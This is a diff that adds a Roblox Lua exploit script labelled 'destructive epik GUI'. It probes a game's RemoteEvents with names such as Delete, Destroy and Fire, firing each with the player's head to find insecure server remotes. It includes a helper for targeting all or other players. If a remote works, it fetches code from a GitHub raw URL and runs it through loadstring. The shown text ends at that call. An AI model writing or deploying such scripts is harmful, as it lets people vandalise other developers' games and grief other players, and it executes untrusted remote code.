@@ -1,0 +1,108 @@
+local StarterGui = game:GetService("StarterGui")
+local showNotification = true
+
+function Notify(tl, t, d) 
+if showNotification == true then
+StarterGui:SetCore("SendNotification", {
+	Title = tl;
+	Text = t;
+	Duration = d;
+	Icon = "http://www.roblox.com/asset/?id=15248033506";
+})
+end
+end
+
+if game.CoreGui:FindFirstChild("destruct") then
+game.CoreGui.destruct:Destroy()
+end
+
+local BlurFX = Instance.new("BlurEffect")
+BlurFX.Size = 0
+BlurFX.Name = "Blur"
+BlurFX.Parent = workspace.CurrentCamera
+
+local function blurefct(siz)
+local TweenService = game:GetService("TweenService")
+local goal = {}
+goal.Size = siz
+
+local tweenInfo = TweenInfo.new(2)
+local tween = TweenService:Create(BlurFX, tweenInfo, goal)
+
+tween:Play()
+end
+
+local remote = "nil"
+local found = false
+local enable = false
+local sent = false
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+
+local checkIn = {"Workspace", "ReplicatedStorage", "StarterGui", "CoreGui"}
+local names = {"Delete", "Deletar", "Remove", "Destroy", "Clean", "Clear","Bullet", "Bala", "Shoot", "Shot", "Fire", "Segway", "Handless", "Sword", "Attack"}
+if char then
+blurefct(20)
+Notify("destructive epik GUI", "buscando remotes espere un rato", 5)
+for _, service in pairs(checkIn) do
+for i,v in pairs(game:GetService(service):GetDescendants()) do
+for _, str in pairs(names) do
+if string.match(v.Name, str) and v:IsA("RemoteEvent") then
+print("Checking " .. v.Name .. " from " .. service .. " service")
+local success, error = pcall(function()
+game:GetService("ReplicatedStorage")[v.Name]:FireServer(LocalPlayer.Character.Head)
+found = true
+end)
+if success then
+remote = game:GetService("ReplicatedStorage")[v.Name]
+end 
+wait(0.5)
+if not LocalPlayer.Character:FindFirstChild("Head") then
+enable = true
+sent = true
+end
+end
+end
+end
+end
+end
+
+if sent == false then
+Notify("destructive epik GUI", "este juego no es vulnerable", 5)
+blurefct(0)
+end
+
+function work(arg1)
+remote:FireServer(arg1)
+end
+
+function GetPlayer(String)
+   local Found = {}
+   local strl = String:lower()
+   if strl == "all" then
+       for i,v in pairs(game.Players:GetPlayers()) do
+           table.insert(Found,v.Name)
+       end
+   elseif strl == "others" then
+       for i,v in pairs(game.Players:GetPlayers()) do
+           if v.Name ~= game.Players.LocalPlayer.Name then
+               table.insert(Found,v.Name)
+           end
+       end  
+elseif strl == "me" then
+       for i,v in pairs(game.Players:GetPlayers()) do
+           if v.Name == game.Players.LocalPlayer.Name then
+               table.insert(Found,v.Name)
+           end
+       end  
+   else
+       for i,v in pairs(game.Players:GetPlayers()) do
+           if v.Name:lower():sub(1, #String) == String:lower() then
+               table.insert(Found,v.Name)
+           end
+       end    
+   end
+   return Found    
+end
+if enable == true then
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/NombrePeXD/Nombre_peHubXD/main/Source'),true))()
